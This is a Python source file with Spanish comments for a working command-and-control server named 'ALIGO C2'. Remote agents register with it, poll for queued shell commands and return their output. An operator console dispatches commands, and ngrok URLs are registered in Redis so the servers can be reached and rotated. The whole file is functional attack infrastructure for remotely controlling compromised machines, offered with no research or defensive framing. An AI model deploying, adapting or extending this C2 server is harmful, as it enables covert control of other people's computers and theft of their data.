"""
Servidor C2 - HTTPS Version con Redis Registry
VERSIÓN MODIFICADA PARA USAR ARCHIVOS DE CONFIGURACIÓN
"""

from flask import Flask, request, jsonify
import threading
import json
import uuid
import os
import sys
import time
import requests
from datetime import datetime

try:
    import redis
except ImportError:
    print("[!] ERROR: Se requiere el módulo 'redis'")
    print("[*] Instálalo con: pip install redis")
    sys.exit(1)

# ============================================
# CARGAR CONFIGURACIÓN POR MÁQUINA
# ============================================

try:
    # Intentar cargar configuración específica de la máquina
    from config_A import *      # En máquina A, descomentar esta
    # from config_B import *    # En máquina B, descomentar esta
    # from config_C import *    # En máquina C, descomentar esta
    print(f"[✓] Configuración cargada: {SERVER_NAME}")
except ImportError:
    # Si no existe archivo de config, usar valores por defecto
    REDIS_HOST = "127.0.0.1"
    REDIS_PORT = 6379
    SERVER_NAME = "server-A"
    HTTP_PORT = 5000
    print("[!] No se encontró config, usando valores por defecto")

# Configurar valores globales
HOST = "0.0.0.0"
PORT = HTTP_PORT

app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False

# Conexión a Redis
try:
    redis_client = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, decode_responses=True, socket_connect_timeout=5)
    redis_client.ping()
    print(f"[✓] Conectado a Redis en {REDIS_HOST}:{REDIS_PORT}")
except Exception as e:
    print(f"[!] Error conectando a Redis en {REDIS_HOST}:{REDIS_PORT}: {e}")
    print(f"[!] Asegúrate de que:")
    print(f"    1. Redis está corriendo en máquina A")
    print(f"    2. La IP {REDIS_HOST} es correcta")
    print(f"    3. Redis escucha en 0.0.0.0 (no solo 127.0.0.1)")
    sys.exit(1)

# Estado local
agents = {}
agents_lock = threading.Lock()
pending_commands = {}
results_history = []
current_ngrok_url = None


# ============================================
# ENDPOINTS HTTP (IGUAL AL ORIGINAL)
# ============================================

@app.route('/checkin', methods=['POST'])
def checkin():
    """Agente se registra inicialmente."""
    data = request.json
    agent_id = data.get('agent_id', str(uuid.uuid4())[:8])
    hostname = data.get('hostname', 'unknown')
    os_type = data.get('os', 'unknown')
    
    with agents_lock:
        agents[agent_id] = {
            "hostname": hostname,
            "os": os_type,
            "last_seen": datetime.now(),
            "ip": request.remote_addr
        }
        if agent_id not in pending_commands:
            pending_commands[agent_id] = []
    
    print(f"\n[+] Agente conectado: {agent_id} desde {request.remote_addr} ({hostname})")
    print("> ", end="", flush=True)
    
    return jsonify({"status": "ok", "agent_id": agent_id})


@app.route('/poll', methods=['POST'])
def poll():
    """Agente pregunta si hay comandos pendientes."""
    data = request.json
    agent_id = data.get('agent_id')
    
    if not agent_id:
        return jsonify({"error": "agent_id requerido"}), 400
    
    with agents_lock:
        if agent_id in agents:
            agents[agent_id]['last_seen'] = datetime.now()
        
        if agent_id in pending_commands and pending_commands[agent_id]:
            cmd = pending_commands[agent_id].pop(0)
            return jsonify(cmd)
    
    return jsonify({"command": None})


@app.route('/result', methods=['POST'])
def result():
    """Agente envía el resultado de un comando ejecutado."""
    data = request.json
    agent_id = data.get('agent_id')
    msg_id = data.get('id')
    output = data.get('output', '')
    status = data.get('status', 'ok')
    
    results_history.append({
        "agent_id": agent_id,
        "id": msg_id,
        "output": output,
        "status": status,
        "timestamp": datetime.now()
    })
    
    print(f"\n[resultado de {agent_id}] (id={msg_id}):")
    print(output)
    print("> ", end="", flush=True)
    
    return jsonify({"status": "ok"})


@app.route('/health', methods=['GET'])
def health():
    """Endpoint de salud."""
    return jsonify({
        "status": "ok",
        "agents_connected": len(agents),
        "server_name": SERVER_NAME,
        "ngrok_url": current_ngrok_url,
        "timestamp": datetime.now().isoformat()
    })


@app.route('/servers-list', methods=['GET'])
def servers_list():
    """Devuelve lista de servidores activos registrados en Redis."""
    try:
        keys = redis_client.keys("server:*:ngrok_url")
        servers = []
        
        for key in keys:
            url = redis_client.get(key)
            if url:
                server_name = key.split(":")[1]
                servers.append({
                    "name": server_name,
                    "url": url,
                    "last_update": redis_client.get(f"server:{server_name}:timestamp")
                })
        
        return jsonify({
            "status": "ok",
            "servers": servers,
            "count": len(servers)
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================
# FUNCIONES DE REGISTRO EN REDIS
# ============================================

def detect_ngrok_url():
    """Detecta la URL de ngrok accediendo a localhost:4040."""
    try:
        response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2)
        tunnels = response.json().get('tunnels', [])
        
        for tunnel in tunnels:
            if tunnel.get('proto') == 'https':
                return tunnel.get('public_url')
    except:
        pass
    
    return None


def register_ngrok_url_in_redis():
    """Detecta URL ngrok y la registra en Redis cada 5 minutos."""
    global current_ngrok_url
    
    while True:
        try:
            ngrok_url = detect_ngrok_url()
            
            if ngrok_url and ngrok_url != current_ngrok_url:
                current_ngrok_url = ngrok_url
                
                redis_client.setex(
                    f"server:{SERVER_NAME}:ngrok_url",
                    600,
                    ngrok_url
                )
                
                redis_client.setex(
                    f"server:{SERVER_NAME}:timestamp",
                    600,
                    datetime.now().isoformat()
                )
                
                print(f"\n[✓] URL registrada en Redis: {ngrok_url}")
                print("> ", end="", flush=True)
        
        except Exception as e:
            print(f"\n[!] Error registrando URL en Redis: {e}")
            print("> ", end="", flush=True)
        
        time.sleep(300)


def cleanup_inactive_agents():
    """Limpia agentes inactivos."""
    from datetime import timedelta
    while True:
        time.sleep(60)
        with agents_lock:
            now = datetime.now()
            inactive_threshold = timedelta(minutes=2)
            inactive_agents = [
                aid for aid, info in agents.items()
                if (now - info['last_seen']) > inactive_threshold
            ]
            for aid in inactive_agents:
                agents.pop(aid, None)
                pending_commands.pop(aid, None)


# ============================================
# CONSOLA DEL OPERADOR
# ============================================

def operator_console():
    """Consola interactiva para que el operador mande comandos."""
    print("Consola de operador. Comandos:")
    print("  list                  -> lista agentes conectados")
    print("  servers               -> lista servidores en Redis")
    print("  use <agent_id> <cmd>  -> manda un comando a un agente")
    print("  use @agent <cmd>      -> usa el único agente (si solo hay uno)")
    print("  exit                  -> salir\n")

    while True:
        try:
            line = input("> ").strip()
        except EOFError:
            break
        except KeyboardInterrupt:
            print("\n[*] Usa 'exit' para salir")
            continue

        if not line:
            continue

        if line == "list":
            from datetime import timedelta
            with agents_lock:
                now = datetime.now()
                active_threshold = timedelta(seconds=30)
                active_agents = {
                    aid: info for aid, info in agents.items()
                    if (now - info['last_seen']) < active_threshold
                }
                
                if not active_agents:
                    print("(sin agentes conectados)")
                else:
                    for aid, info in active_agents.items():
                        last_seen = info['last_seen'].strftime("%H:%M:%S")
                        print(f" - {aid} | {info['hostname']} | last_seen: {last_seen}")

        elif line == "servers":
            try:
                keys = redis_client.keys("server:*:ngrok_url")
                if not keys:
                    print("(sin servidores registrados en Redis)")
                else:
                    print(f"Servidores activos ({len(keys)}):")
                    for key in keys:
                        server_name = key.split(":")[1]
                        url = redis_client.get(key)
                        print(f" - {server_name}: {url}")
            except Exception as e:
                print(f"Error consultando Redis: {e}")

        elif line.startswith("use "):
            parts = line.split(" ", 2)
            if len(parts) < 3:
                print("Uso: use <agent_id> <comando>")
                print("     use @agent <comando>")
                continue
            
            _, agent_id, command = parts
            
            if agent_id == "@agent":
                with agents_lock:
                    if len(agents) == 0:
                        print("Error: No hay agentes conectados")
                        continue
                    elif len(agents) == 1:
                        agent_id = list(agents.keys())[0]
                        print(f"[auto-seleccionado] {agent_id}")
                    else:
                        print(f"Error: Hay {len(agents)} agentes conectados. Especifica uno:")
                        for aid in agents:
                            print(f" - {aid}")
                        continue
            
            with agents_lock:
                if agent_id not in agents:
                    print(f"Agente '{agent_id}' no encontrado")
                    continue
            
            msg_id = str(uuid.uuid4())[:8]
            cmd_obj = {
                "type": "cmd",
                "id": msg_id,
                "command": command
            }
            
            with agents_lock:
                if agent_id not in pending_commands:
                    pending_commands[agent_id] = []
                pending_commands[agent_id].append(cmd_obj)
            
            print(f"[enviado] id={msg_id} -> {agent_id}: {command}")

        elif line == "exit":
            print("[*] Cerrando servidor...")
            os._exit(0)

        else:
            print(f"Comando no reconocido: {line}")


# ============================================
# MAIN
# ============================================

def main():
    print("=" * 60)
    print(f"  ALIGO C2 - Servidor HTTPS ({SERVER_NAME})")
    print("=" * 60)
    print(f"[*] Servidor HTTP escuchando en {HOST}:{PORT}")
    print(f"[*] Servidor registrado como: {SERVER_NAME}")
    print(f"[*] Redis: {REDIS_HOST}:{REDIS_PORT}")
    print(f"[*] Usa ngrok con: ngrok http {PORT}")
    print()
    
    # Threads
    threading.Thread(target=register_ngrok_url_in_redis, daemon=True).start()
    threading.Thread(target=cleanup_inactive_agents, daemon=True).start()
    
    def run_flask():
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)
        app.run(host=HOST, port=PORT, debug=False, use_reloader=False)
    
    threading.Thread(target=run_flask, daemon=True).start()
    time.sleep(1)
    
    try:
        operator_console()
    except KeyboardInterrupt:
        print("\n[*] Servidor detenido")
        sys.exit(0)


if __name__ == "__main__":
    main()
